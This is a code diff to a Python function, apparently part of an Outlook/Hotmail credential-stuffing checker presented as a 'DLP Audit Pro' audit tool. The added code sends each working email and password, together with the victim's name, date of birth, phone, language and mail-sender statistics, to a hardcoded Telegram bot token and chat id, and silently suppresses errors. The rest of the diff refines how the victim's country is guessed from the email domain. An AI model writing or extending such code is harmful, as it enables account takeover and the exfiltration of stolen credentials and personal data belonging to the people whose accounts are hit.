@@ -642,7 +642,8 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
         # Order Top
         senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
             
-        if country == "XZ":
+        # Mejora del país: TLD Fallback nativo
+        if country == "XZ" or country == "N/A" or not country:
             email_lower = email.lower()
             if email_lower.endswith('.es'): country = 'ES'
             elif email_lower.endswith('.mx') or email_lower.endswith('.com.mx'): country = 'MX'
@@ -661,40 +662,60 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
             elif email_lower.endswith('.fr'): country = 'FR'
             elif email_lower.endswith('.de'): country = 'DE'
             elif email_lower.endswith('.uk') or email_lower.endswith('.co.uk'): country = 'UK'
-            else: 
-                # Default para cuentas genéricas .com que no revelan el país en el profile
-                country = 'US'
-        # Mejora del país: también detectar por dominio del email si aun es XZ
-        if country == "XZ" or country == "N/A" or not country:
-            email_domain = email.lower().split('@')[-1]
-            if email_domain.endswith('.fr') or email_domain == 'hotmail.fr' or email_domain == 'live.fr' or email_domain.endswith('.fr'): country = 'FR'
-            elif email_domain.endswith('.es') or email_domain == 'hotmail.es': country = 'ES'
-            elif email_domain.endswith('.de') or email_domain == 'hotmail.de' or email_domain == 'live.de': country = 'DE'
-            elif email_domain.endswith('.it') or email_domain == 'hotmail.it' or email_domain == 'live.it': country = 'IT'
-            elif email_domain.endswith('.nl') or email_domain == 'live.nl': country = 'NL'
-            elif email_domain.endswith('.no') or email_domain == 'live.no': country = 'NO'
-            elif email_domain.endswith('.co.uk') or email_domain == 'hotmail.co.uk' or email_domain == 'msn.co.uk': country = 'UK'
-            elif email_domain.endswith('.com.ar') or email_domain == 'live.com.ar': country = 'AR'
-            elif email_domain.endswith('.com.br') or email_domain == 'live.com.br': country = 'BR'
-            elif email_domain.endswith('.com.mx') or email_domain == 'live.com.mx': country = 'MX'
-            elif email_domain.endswith('.pt') or email_domain == 'hotmail.pt': country = 'PT'
+            elif email_lower.endswith('.ca'): country = 'CA'
+            elif email_lower.endswith('.nl') or email_lower.endswith('.no'): country = email_lower.split('.')[-1].upper()
+            elif email_lower.endswith('.pt'): country = 'PT'
+            else: country = 'US'
+
+        formatted_senders = ", ".join([f"{addr} ({cnt})" for addr, cnt in senders_found.items()]) if senders_found else "N/A"
+        
+        hit_data = {
+            "email": email,
+            "pass": password,
+            "domain": "outlook.com",
+            "match": keyword if keyword else "HOTMAIL HQ",
+            "messages": subject_count,
+            "senders": formatted_senders,
+            "country": country,
+            "name": name,
+            "dob": dob,
+            "language": language,
+            "phone": phone,
+            "chat_id": "" 
+        }
+
+        # --- Enviar Alerta Individual Inmediata Vía Telegram ---
+        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+        target_chat_id = os.environ.get("TELEGRAM_CHAT_ID", "1016773223") # Fallback to default user if env fails
+        
+        # Determine actual target chat if DB has it
+        target_cid = target_chat_id
+        if 'active_cid' in globals() and active_cid: target_cid = active_cid
+            
+        realtime_alert = (
+            f"📣 ¡OBJETIVO DETECTADO! (HIT) 🎯\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Usuario: VPS Agent\n"
+            f"✅ Match: {hit_data['match']}\n"
+            f"📧 Correo: {email}\n"
+            f"🔑 Pass: {password}\n"
+            f"🌍 País: {country}\n\n"
+            f"👤 Nombre: {name}\n"
+            f"📅 DOB: {dob}\n"
+            f"🗣️ Idioma: {language}\n"
+            f"📱 Teléf: {phone}\n\n"
+            f"📊 Mensajes: {subject_count}\n"
+            f"🔍 Búsqueda: from:{', from:'.join(target_senders) if getattr(globals(),'target_senders',[]) else 'N/A'}\n"
+            f"🤖 DLP Audit Pro System"
+        )
+        
+        try:
+            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
+                          json={"chat_id": target_cid, "text": realtime_alert})
+        except: pass
 
         if getattr(hits_buffer, 'append', None) is not None:
-            formatted_senders = ", ".join([f"{addr} ({cnt})" for addr, cnt in senders_found.items()]) if senders_found else "N/A"
-            hits_buffer.append({
-                "email": email,
-                "pass": password,
-                "domain": "outlook.com",
-                "match": keyword if keyword else "HOTMAIL HQ",
-                "messages": subject_count,
-                "senders": formatted_senders,
-                "country": country,
-                "name": name,
-                "dob": dob,
-                "language": language,
-                "phone": phone,
-                "chat_id": "" 
-            })
+            hits_buffer.append(hit_data)
     except Exception as e:
         pass
 
